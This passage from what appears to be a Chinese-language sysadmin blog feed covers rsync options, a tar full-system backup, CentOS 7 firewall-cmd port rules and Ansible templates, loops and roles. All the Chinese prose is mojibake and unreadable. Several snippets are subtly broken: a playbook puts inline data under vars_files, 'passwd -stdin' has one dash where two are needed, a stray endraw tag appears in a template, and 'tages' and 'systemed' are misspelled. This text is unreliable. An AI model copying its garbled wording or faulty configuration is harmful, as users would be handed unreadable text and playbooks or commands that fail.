        <content type="html"><![CDATA[<p><a href="https://blog.51cto.com/13272050/2094687">å‚è€ƒé“¾æ¥: å·¦å®¢ rsyncå¢é‡å¤‡ä»½</a></p><h3 id="tar-å¤‡ä»½å¤±è´¥"><a href="#tar-å¤‡ä»½å¤±è´¥" class="headerlink" title="tar å¤‡ä»½å¤±è´¥"></a>tar å¤‡ä»½å¤±è´¥</h3><p>ä¸€ä¸ªå°å‘:<br>æˆ‘åœ¨æ‰§è¡Œä¸‹é¢å‘½ä»¤çš„æ—¶å€™, å¦‚æœæˆ‘ä¸æ˜¯åœ¨æ ¹ç›®å½•, ä¼šå¯¼è‡´å¤‡ä»½å¤±è´¥, ä¸æ˜¯å¾ˆæ‡‚ä¸ºä»€ä¹ˆ.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time tar cvpjf <span class="variable">$&#123;BZ2BACKUP&#125;</span> --exclude=/proc --exclude=/lost+found --exclude=/<span class="variable">$&#123;BZ2BACKUP&#125;</span> --exclude=/mnt --exclude=/sys --exclude=/media /</span><br></pre></td></tr></table></figure><h3 id="rsync-ä¸‰ç§å·¥ä½œæ–¹å¼"><a href="#rsync-ä¸‰ç§å·¥ä½œæ–¹å¼" class="headerlink" title="rsync ä¸‰ç§å·¥ä½œæ–¹å¼"></a>rsync ä¸‰ç§å·¥ä½œæ–¹å¼</h3><ul><li><p>æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šå®ç°åŒæ­¥ã€‚å‘½ä»¤è¡Œè¯­æ³•æ ¼å¼ä¸ºä¸Šè¿°â€Localâ€æ®µçš„æ ¼å¼ã€‚</p></li><li><p>æœ¬åœ°ä¸»æœºä½¿ç”¨è¿œç¨‹shellå’Œè¿œç¨‹ä¸»æœºé€šä¿¡ã€‚å‘½ä»¤è¡Œè¯­æ³•æ ¼å¼ä¸ºä¸Šè¿°â€Access via remote shellâ€æ®µçš„æ ¼å¼ã€‚</p></li><li><p>æœ¬åœ°ä¸»æœºé€šè¿‡ç½‘ç»œå¥—æ¥å­—è¿æ¥è¿œç¨‹ä¸»æœºä¸Šçš„rsync daemonã€‚å‘½ä»¤è¡Œè¯­æ³•æ ¼å¼ä¸ºä¸Šè¿°â€Access via rsync daemonâ€æ®µçš„æ ¼å¼ã€‚</p></li></ul><pre style = "margin: 0 -120px; font-size: 14px; width: 970px; line-height: 26px;">    <font color = #00B000>ç›¸å…³å‚æ•°è¯´æ˜:-vï¼šæ˜¾ç¤ºrsyncè¿‡ç¨‹ä¸­è¯¦ç»†ä¿¡æ¯ã€‚å¯ä»¥ä½¿ç”¨"-vvvv"è·å–æ›´è¯¦ç»†ä¿¡æ¯ã€‚-Pï¼šæ˜¾ç¤ºæ–‡ä»¶ä¼ è¾“çš„è¿›åº¦ä¿¡æ¯ã€‚(å®é™…ä¸Š"-P"="--partial --progress"ï¼Œå…¶ä¸­çš„"--progress"æ‰æ˜¯æ˜¾ç¤ºè¿›åº¦ä¿¡æ¯çš„)ã€‚-n --dry-run  ï¼šä»…æµ‹è¯•ä¼ è¾“ï¼Œè€Œä¸å®é™…ä¼ è¾“ã€‚å¸¸å’Œ"-vvvv"é…åˆä½¿ç”¨æ¥æŸ¥çœ‹rsyncæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚-a --archive  ï¼šå½’æ¡£æ¨¡å¼ï¼Œè¡¨ç¤ºé€’å½’ä¼ è¾“å¹¶ä¿æŒæ–‡ä»¶å±æ€§ã€‚ç­‰åŒäº"-rtopgDl"ã€‚-r --recursiveï¼šé€’å½’åˆ°ç›®å½•ä¸­å»ã€‚-t --timesï¼šä¿æŒmtimeå±æ€§ã€‚å¼ºçƒˆå»ºè®®ä»»ä½•æ—¶å€™éƒ½åŠ ä¸Š"-t"ï¼Œå¦åˆ™ç›®æ ‡æ–‡ä»¶mtimeä¼šè®¾ç½®ä¸ºç³»ç»Ÿæ—¶é—´ï¼Œå¯¼è‡´ä¸‹æ¬¡æ›´æ–°          ï¼šæ£€æŸ¥å‡ºmtimeä¸åŒä»è€Œå¯¼è‡´å¢é‡ä¼ è¾“æ— æ•ˆã€‚-o --ownerï¼šä¿æŒownerå±æ€§(å±ä¸»)ã€‚-g --groupï¼šä¿æŒgroupå±æ€§(å±ç»„)ã€‚-p --permsï¼šä¿æŒpermså±æ€§(æƒé™ï¼Œä¸åŒ…æ‹¬ç‰¹æ®Šæƒé™)ã€‚-D        ï¼šæ˜¯"--device --specials"é€‰é¡¹çš„ç»„åˆï¼Œå³ä¹Ÿæ‹·è´è®¾å¤‡æ–‡ä»¶å’Œç‰¹æ®Šæ–‡ä»¶ã€‚-l --linksï¼šå¦‚æœæ–‡ä»¶æ˜¯è½¯é“¾æ¥æ–‡ä»¶ï¼Œåˆ™æ‹·è´è½¯é“¾æ¥æœ¬èº«è€Œéè½¯é“¾æ¥æ‰€æŒ‡å‘çš„å¯¹è±¡ã€‚-z        ï¼šä¼ è¾“æ—¶è¿›è¡Œå‹ç¼©æé«˜æ•ˆç‡ã€‚-R --relativeï¼šä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚æ„å‘³ç€å°†å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„å…¨è·¯å¾„è€Œéè·¯å¾„æœ€å°¾éƒ¨çš„æ–‡ä»¶åå‘é€ç»™æœåŠ¡ç«¯ï¼ŒåŒ…æ‹¬å®ƒä»¬çš„å±æ€§ã€‚ç”¨æ³•è§ä¸‹æ–‡ç¤ºä¾‹ã€‚--size-only ï¼šé»˜è®¤ç®—æ³•æ˜¯æ£€æŸ¥æ–‡ä»¶å¤§å°å’Œmtimeä¸åŒçš„æ–‡ä»¶ï¼Œä½¿ç”¨æ­¤é€‰é¡¹å°†åªæ£€æŸ¥æ–‡ä»¶å¤§å°ã€‚-u --update ï¼šä»…åœ¨æºmtimeæ¯”ç›®æ ‡å·²å­˜åœ¨æ–‡ä»¶çš„mtimeæ–°æ—¶æ‰æ‹·è´ã€‚æ³¨æ„ï¼Œè¯¥é€‰é¡¹æ˜¯æ¥æ”¶ç«¯åˆ¤æ–­çš„ï¼Œä¸ä¼šå½±å“åˆ é™¤è¡Œä¸ºã€‚-d --dirs   ï¼šä»¥ä¸é€’å½’çš„æ–¹å¼æ‹·è´ç›®å½•æœ¬èº«ã€‚é»˜è®¤é€’å½’æ—¶ï¼Œå¦‚æœæºä¸º"dir1/file1"ï¼Œåˆ™ä¸ä¼šæ‹·è´dir1ç›®å½•ï¼Œä½¿ç”¨è¯¥é€‰é¡¹å°†æ‹·è´dir1ä½†ä¸æ‹·è´file1ã€‚--max-size  ï¼šé™åˆ¶rsyncä¼ è¾“çš„æœ€å¤§æ–‡ä»¶å¤§å°ã€‚å¯ä»¥ä½¿ç”¨å•ä½åç¼€ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€ä¸ªå°æ•°å€¼(ä¾‹å¦‚ï¼š"--max-size=1.5m")--min-size  ï¼šé™åˆ¶rsyncä¼ è¾“çš„æœ€å°æ–‡ä»¶å¤§å°ã€‚è¿™å¯ä»¥ç”¨äºç¦æ­¢ä¼ è¾“å°æ–‡ä»¶æˆ–é‚£äº›åƒåœ¾æ–‡ä»¶ã€‚--exclude   ï¼šæŒ‡å®šæ’é™¤è§„åˆ™æ¥æ’é™¤ä¸éœ€è¦ä¼ è¾“çš„æ–‡ä»¶ã€‚--delete    ï¼šä»¥SRCä¸ºä¸»ï¼Œå¯¹DESTè¿›è¡ŒåŒæ­¥ã€‚å¤šåˆ™åˆ ä¹‹ï¼Œå°‘åˆ™è¡¥ä¹‹ã€‚æ³¨æ„"--delete"æ˜¯åœ¨æ¥æ”¶ç«¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥å®ƒæ˜¯åœ¨            ï¼šexclude/includeè§„åˆ™ç”Ÿæ•ˆä¹‹åæ‰æ‰§è¡Œçš„ã€‚-b --backup ï¼šå¯¹ç›®æ ‡ä¸Šå·²å­˜åœ¨çš„æ–‡ä»¶åšä¸€ä¸ªå¤‡ä»½ï¼Œå¤‡ä»½çš„æ–‡ä»¶ååé»˜è®¤ä½¿ç”¨"~"åšåç¼€ã€‚--backup-dirï¼šæŒ‡å®šå¤‡ä»½æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ã€‚ä¸æŒ‡å®šæ—¶é»˜è®¤å’Œå¾…å¤‡ä»½æ–‡ä»¶ä¿å­˜åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚-e          ï¼šæŒ‡å®šæ‰€è¦ä½¿ç”¨çš„è¿œç¨‹shellç¨‹åºï¼Œé»˜è®¤ä¸ºsshã€‚--port      ï¼šè¿æ¥daemonæ—¶ä½¿ç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸º873ç«¯å£ã€‚--password-fileï¼šdaemonæ¨¡å¼æ—¶çš„å¯†ç æ–‡ä»¶ï¼Œå¯ä»¥ä»ä¸­è¯»å–å¯†ç å®ç°éäº¤äº’å¼ã€‚æ³¨æ„ï¼Œè¿™ä¸æ˜¯è¿œç¨‹shellè®¤è¯çš„å¯†ç ï¼Œè€Œæ˜¯rsyncæ¨¡å—è®¤è¯çš„å¯†ç ã€‚-W --whole-fileï¼šrsyncå°†ä¸å†ä½¿ç”¨å¢é‡ä¼ è¾“ï¼Œè€Œæ˜¯å…¨é‡ä¼ è¾“ã€‚åœ¨ç½‘ç»œå¸¦å®½é«˜äºç£ç›˜å¸¦å®½æ—¶ï¼Œè¯¥é€‰é¡¹æ¯”å¢é‡ä¼ è¾“æ›´é«˜æ•ˆã€‚--existing  ï¼šè¦æ±‚åªæ›´æ–°ç›®æ ‡ç«¯å·²å­˜åœ¨çš„æ–‡ä»¶ï¼Œç›®æ ‡ç«¯è¿˜ä¸å­˜åœ¨çš„æ–‡ä»¶ä¸ä¼ è¾“ã€‚æ³¨æ„ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„æ—¶å¦‚æœä¸Šå±‚ç›®å½•ä¸å­˜åœ¨ä¹Ÿä¸ä¼šä¼ è¾“ã€‚--ignore-existingï¼šè¦æ±‚åªæ›´æ–°ç›®æ ‡ç«¯ä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚å’Œ"--existing"ç»“åˆä½¿ç”¨æœ‰ç‰¹æ®ŠåŠŸèƒ½ï¼Œè§ä¸‹æ–‡ç¤ºä¾‹ã€‚--remove-source-filesï¼šè¦æ±‚åˆ é™¤æºç«¯å·²ç»æˆåŠŸä¼ è¾“çš„æ–‡ä»¶ã€‚    </font></pre>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7</title>
      <link href="2019/07/09/CentOS7/"/>
      <url>2019/07/09/CentOS7/</url>
      
        <content type="html"><![CDATA[<h4 id="æˆ‘ä½¿ç”¨æ»´-CentOS-7-ç‰ˆæœ¬-CentOS-Linux-release-7-2-1511-Core"><a href="#æˆ‘ä½¿ç”¨æ»´-CentOS-7-ç‰ˆæœ¬-CentOS-Linux-release-7-2-1511-Core" class="headerlink" title="æˆ‘ä½¿ç”¨æ»´ CentOS 7 ç‰ˆæœ¬: CentOS Linux release 7.2.1511 (Core)"></a>æˆ‘ä½¿ç”¨æ»´ CentOS 7 ç‰ˆæœ¬: CentOS Linux release 7.2.1511 (Core)</h4><h3 id="CentOS-6-å’Œ-CentOS-7-åœ¨åä¸ºå¹³å°ä¸Šçš„ä¸¤ä¸ªä¸»è¦åŒºåˆ«"><a href="#CentOS-6-å’Œ-CentOS-7-åœ¨åä¸ºå¹³å°ä¸Šçš„ä¸¤ä¸ªä¸»è¦åŒºåˆ«" class="headerlink" title="CentOS 6 å’Œ CentOS 7 åœ¨åä¸ºå¹³å°ä¸Šçš„ä¸¤ä¸ªä¸»è¦åŒºåˆ«"></a>CentOS 6 å’Œ CentOS 7 åœ¨åä¸ºå¹³å°ä¸Šçš„ä¸¤ä¸ªä¸»è¦åŒºåˆ«</h3><ul><li><p>CentOS6ï¼š</p><ul><li>æ”¯æŒå¿«ç…§ï¼›</li><li>é‡‡ç”¨sysvinitï¼ŒæœåŠ¡å¯åŠ¨ç¨æ…¢ï¼Œfstabå’ŒnfsæŒ‚è½½å®¹æ˜“å‡ºç°é—®é¢˜ã€‚</li></ul></li><li><p>CentOS7ï¼š</p><ul><li>ä¸æ”¯æŒå¿«ç…§ï¼Œéœ€è¦è‡ªå·±å¤‡ä»½ï¼›</li><li>é‡‡ç”¨systemedï¼Œè®¾è®¡ç›®æ ‡æ˜¯å…‹æœsysvinitçš„ç¼ºç‚¹ã€‚</li></ul></li></ul><h3 id="firewalld-amp-amp-firewall-cmd"><a href="#firewalld-amp-amp-firewall-cmd" class="headerlink" title="firewalld &amp;&amp; firewall-cmd"></a>firewalld &amp;&amp; firewall-cmd</h3><p>æ–°å®‰è£…å¥½ nginx çš„æˆ‘å…´è‡´å‹ƒå‹ƒçš„è¾“å…¥æˆ‘çš„ip, ç»“æœâ€¦.<br><img src="/img/Linux_Server_Maintenance/firewall_nginx_err.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/firewall_nginx_err.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="firewall_nginx_err"></p><p>äºæ˜¯æˆ‘æ£€æŸ¥ æœåŠ¡çŠ¶æ€, é…ç½®æ–‡ä»¶ å’Œ æ—¥å¿—æ–‡ä»¶ å¥½åƒåœ¨ Ubuntu ä¸Šéƒ½æ˜¯ä¸€æ ·å‘€..<br>ç„¶åå‘ç°äº† CentOS7 çš„é˜²ç«å¢™é»˜è®¤åªå¼€å¯ ssh æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-services</span><br></pre></td></tr></table></figure><p>é‚£æ€ä¹ˆå»å¼€å¯ä¸€ä¸ªç«¯å£å‘¢? è¿™é‡Œç”¨ 80 ç«¯å£ä¸¾ä¾‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent  <span class="comment"># ï¼ˆ--permanentæ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åå¤±æ•ˆï¼‰</span></span><br><span class="line">firewall-cmd --reload <span class="comment"># é‡æ–°è½½å…¥</span></span><br><span class="line">firewall-cmd --zone=public --query-port=80/tcp <span class="comment"># æŸ¥çœ‹ 80 ç«¯å£</span></span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp --permanent <span class="comment"># å…³é—­ 80 ç«¯å£</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ­£å¸¸è®¿é—® nginx å•¦!</p><p>äºæ˜¯åˆæƒ³èµ·è®¸å¤šé˜²ç«å¢™æ˜¯é€šè¿‡ iptables å»ç®¡ç†çš„, é¡ºä¾¿åˆ° Red Hat å®˜æ–¹æ–‡æ¡£ gup äº†ä¸€ä¸‹</p><p>å‘ç°åœ¨ RHEL7 ç³»ç»Ÿä¸­, ç³»ç»Ÿé»˜è®¤æ˜¯è‡ªå¸¦ firewall çš„, å¹¶ä¸”é»˜è®¤å…³é—­å¼€å¯80ç«¯å£</p><p>å€¼å¾—ä¸€æçš„æ˜¯ firewall è°ƒç”¨ iptables çš„ç›¸å…³å‘½ä»¤.</p><p>æƒ³è¦è¯¦ç»†äº†è§£å¯ä»¥å‚è€ƒ <a href="https://blog.csdn.net/liitdar/article/details/80889177">liitdarçš„åšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯† ansible (ä¸‰)</title>
      <link href="2019/07/08/%E5%88%9D%E8%AF%86-ansible-3/"/>
      <url>2019/07/08/%E5%88%9D%E8%AF%86-ansible-3/</url>
      
        <content type="html"><![CDATA[<h3 id="æ¨¡æ¿-templates"><a href="#æ¨¡æ¿-templates" class="headerlink" title="æ¨¡æ¿ templates"></a>æ¨¡æ¿ templates</h3><p>Jinja2è¯­è¨€</p><p>ç®—æ•°è¿ç®—: //(å–æ•´)</p><p>å»ºè®®æ”¾åœ¨ansibleç›®å½•ä¸‹, åˆ›å»ºä¸€ä¸ª templates æ–‡ä»¶å¤¹</p><p>æ¨¡æ¿æ–‡ä»¶åç¼€ .j2</p><p>é…ç½®æ–‡ä»¶å˜é‡ç”¨  {{ }}   æ‹¬èµ·æ¥</p><h3 id="with-items-è¿­ä»£"><a href="#with-items-è¿­ä»£" class="headerlink" title="with_items è¿­ä»£"></a>with_items è¿­ä»£</h3><p>å¯¹è¿­ä»£é¡¹çš„å¼•ç”¨ï¼Œ å›ºå®šå˜é‡åä¸º â€œitemâ€<br>è¦åœ¨ task ä¸­ä½¿ç”¨ with_items ç»™å®šè¦è¿­ä»£çš„å…ƒç´ åˆ—è¡¨<br>åˆ—è¡¨æ ¼å¼: å­—ç¬¦ä¸² æˆ– å­—å…¸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  remote_user: root</span><br><span class="line">  vars_files:</span><br><span class="line">    - vars.yml</span><br><span class="line"></span><br><span class="line">  tasks:</span><br><span class="line">    - name: unarchive</span><br><span class="line">      unarchive: src=&#123;&#123; ansibleShellRoot &#125;&#125;&#123;&#123; item &#125;&#125; dest=/tmp/ copy=yes</span><br><span class="line">      with_items:</span><br><span class="line">        - test1.tar.gz</span><br><span class="line">        - test2.tar.gz</span><br><span class="line">        - test3.tar.gz</span><br></pre></td></tr></table></figure><h3 id="playbook-gt-template-ä¸­çš„-for-å’Œ-if"><a href="#playbook-gt-template-ä¸­çš„-for-å’Œ-if" class="headerlink" title="playbook -&gt; template ä¸­çš„ for å’Œ if"></a>playbook -&gt; template ä¸­çš„ for å’Œ if</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># for</span><br><span class="line">&#123;% for vhost in nginx_vhosts %&#125;</span><br><span class="line">&#123;% endraw %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; vhost.listen | default(&#39;80 default_server&#39; ) &#125;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># if</span><br><span class="line">&#123;% if vhost.server_name is defined %&#125;</span><br><span class="line">server_name &#123;</span><br><span class="line">&#123;&#123; vhost.server_name &#125;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"># if</span><br><span class="line">&#123;% if vhost.server_name is defined %&#125;</span><br><span class="line">root &#123;&#123; vhost.root &#125;&#125;;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="for-å¾ªç¯ä¸¾ä¾‹"><a href="#for-å¾ªç¯ä¸¾ä¾‹" class="headerlink" title="for å¾ªç¯ä¸¾ä¾‹"></a>for å¾ªç¯ä¸¾ä¾‹</h4><p>.conf.j2 æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for p in ports %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; p.port &#125;&#125;;</span><br><span class="line">servername &#123;&#123; p.name &#125;&#125;;</span><br><span class="line">root &#123;&#123; p.rootdir &#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>.yml æ–‡ä»¶</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web1:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web1.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web2:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">82</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web2.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web3:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web3.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web3</span></span><br><span class="line">        </span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">conf</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=/path/**.conf.j2</span> <span class="string">dest=/path/**.conf</span></span><br></pre></td></tr></table></figure><h4 id="if-åˆ¤æ–­ä¸¾ä¾‹"><a href="#if-åˆ¤æ–­ä¸¾ä¾‹" class="headerlink" title="if åˆ¤æ–­ä¸¾ä¾‹"></a>if åˆ¤æ–­ä¸¾ä¾‹</h4><p>.conf.j2 æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for p in ports %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; p.port &#125;&#125;;</span><br><span class="line"></span><br><span class="line">&#123;% if p.name is defined %&#125;</span><br><span class="line">servername &#123;&#123; p.name &#125;&#125;;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">root &#123;&#123; p.rootdir &#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>.yml æ–‡ä»¶</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web1:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web2:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">82</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web2.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web3:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web3</span></span><br><span class="line">        </span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">conf</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=/path/**.conf.j2</span> <span class="string">dest=/path/**.conf</span></span><br></pre></td></tr></table></figure><h3 id="roles-è§’è‰²"><a href="#roles-è§’è‰²" class="headerlink" title="roles è§’è‰²"></a>roles è§’è‰²</h3><p>roles ä½¿å¾— playbook æ¨¡å—åŒ–ï¼Œå¹¶ä¸”åœ¨æ¨¡å—ä¸­çš„ - include roles/path ä¸­çš„rolesä¸º /etc/ansible/ è·¯å¾„ä¸‹çš„ roles. </p><p>roles çš„ç›®å½•æ ‘ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º (å…¶ä¸­çš„main.yml ç±»ä¼¼äºå…¥å£å‡½æ•°, è´Ÿè´£æŒ‰ç…§ä¸€å®šé¡ºåºè°ƒç”¨å„ä¸ªæ¨¡å—):<br><img src="/img/ansible/tree_ansible_roles.png" class="lazyload" data-srcset="/img/ansible/tree_ansible_roles.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="tree_ansible_roles"></p><p>å¦‚æœä¸Šå›¾ä¸­çš„ nginx è§’è‰²è¦è°ƒç”¨ä¸åŒè§’è‰²çš„æ–‡ä»¶, éœ€è¦ - include roles/è§’è‰²/tasks/æŸæŸ.yml</p><h4 id="è§’è‰²æ ‡ç­¾"><a href="#è§’è‰²æ ‡ç­¾" class="headerlink" title="è§’è‰²æ ‡ç­¾"></a>è§’è‰²æ ‡ç­¾</h4><p>roles:</p><ul><li>{ role: nginx, tages:[â€˜webâ€™, â€˜nginxâ€™]}</li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯† ansible (äºŒ)</title>
      <link href="2019/07/08/%E5%88%9D%E8%AF%86-ansible-2/"/>
      <url>2019/07/08/%E5%88%9D%E8%AF%86-ansible-2/</url>
      
        <content type="html"><![CDATA[<h3 id="ansible-å¸¸ç”¨æ¨¡å—"><a href="#ansible-å¸¸ç”¨æ¨¡å—" class="headerlink" title="ansible å¸¸ç”¨æ¨¡å—"></a>ansible å¸¸ç”¨æ¨¡å—</h3><ul><li><p>Command: åœ¨è¿œç¨‹ä¸»æœºæ‰§è¡Œå‘½ä»¤, é»˜è®¤æ¨¡å—, å¯å¿½ç•¥ -m é€‰é¡¹<br>ansible all (-m command) -a â€˜service nginx restartâ€™<br>æ­¤å‘½ä»¤ä¸æ”¯æŒ $VARNAME &lt; &gt; | ; &amp; *ç­‰, ç”¨ shell æ¨¡å—å®ç°</p></li><li><p>Shell: </p><ul><li>-a å‚æ•°å°½é‡æ”¾åˆ°å•å¼•å·ä¸­!<br>ansible all -m shell -a â€˜echo pass | passwd -stdin userâ€™<br>è°ƒç”¨bashæ‰§è¡Œå‘½ä»¤ è•¾è¥¿ cat /tmp/stanley.md | awk -F â€˜|â€™ â€˜print $1,$2â€™ &amp;&gt; /tmp/example.txt<br>è¿™äº›å¤æ‚å‘½ä»¤, å³ä½¿ä½¿ç”¨ shell ä¹Ÿå¯èƒ½ä¼šå¤±è´¥, è§£å†³åŠæ³•: å†™åˆ°è„šæœ¬æ—¶, copyåˆ°è¿œç¨‹, æ‰§è¡Œ. 